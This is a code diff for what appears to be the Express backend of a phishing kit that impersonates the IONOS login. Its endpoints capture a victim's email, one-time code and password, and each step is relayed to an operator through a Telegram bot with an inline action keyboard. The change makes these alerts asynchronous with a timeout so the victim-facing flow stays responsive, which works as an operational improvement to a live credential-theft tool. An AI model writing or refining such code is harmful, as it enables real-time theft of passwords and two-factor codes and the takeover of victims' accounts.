@@ -53,11 +53,19 @@ async function sendTelegram(text, replyMarkup) {
   };
   if (replyMarkup) body.reply_markup = replyMarkup;
 
-  const res = await fetch(url, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(body),
-  });
+  const controller = new AbortController();
+  const timer = setTimeout(() => controller.abort(), 8000);
+  let res;
+  try {
+    res = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(body),
+      signal: controller.signal,
+    });
+  } finally {
+    clearTimeout(timer);
+  }
   const data = await res.json().catch(() => ({}));
   if (!res.ok || !data.ok) {
     console.error("[telegram]", data.description || res.statusText);
@@ -83,6 +91,12 @@ async function notifyFlowSession(session, title) {
   if (process.env.TELEGRAM_NOTIFY !== "true") return;
   const keyboard = flow.buildTelegramKeyboard(session);
   await sendTelegram(flow.formatSessionMessage(session, title), keyboard || undefined);
+}
+
+function notifyFlowSessionAsync(session, title) {
+  notifyFlowSession(session, title).catch((err) =>
+    console.error("[telegram] notify failed:", err.message)
+  );
 }
 
 async function handleTelegramCallback(callbackQuery) {
@@ -357,7 +371,7 @@ app.get("/ionos-flow.js", (_req, res) => {
 app.get("/health", (_req, res) =>
   res.json({
     ok: true,
-    version: 2,
+    version: 3,
     sessionStore: getStoreMode(),
     supabase: Boolean(process.env.SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY),
     commit: process.env.VERCEL_GIT_COMMIT_SHA || "local",
@@ -378,7 +392,7 @@ app.post("/api/ionos/start", async (req, res) => {
     ua: req.headers["user-agent"] || "",
   });
 
-  await notifyFlowSession(session, "📧 IONOS — Email eingegeben");
+  notifyFlowSessionAsync(session, "📧 IONOS — Email eingegeben");
 
   return res.json({ ok: true, sessionId: session.id, store: getStoreMode() });
 });
@@ -419,7 +433,7 @@ app.post("/api/ionos/session/:id/code", async (req, res) => {
   });
 
   const updated = await flow.getSession(session.id);
-  await notifyFlowSession(updated, "🔢 IONOS — Code eingegeben");
+  notifyFlowSessionAsync(updated, "🔢 IONOS — Code eingegeben");
 
   return res.json({ ok: true, sessionId: session.id });
 });
@@ -438,7 +452,7 @@ app.post("/api/ionos/session/:id/password", async (req, res) => {
   });
 
   const updated = await flow.getSession(session.id);
-  await notifyFlowSession(updated, "🔑 IONOS — Passwort eingegeben");
+  notifyFlowSessionAsync(updated, "🔑 IONOS — Passwort eingegeben");
 
   return res.json({ ok: true, sessionId: session.id });
 });
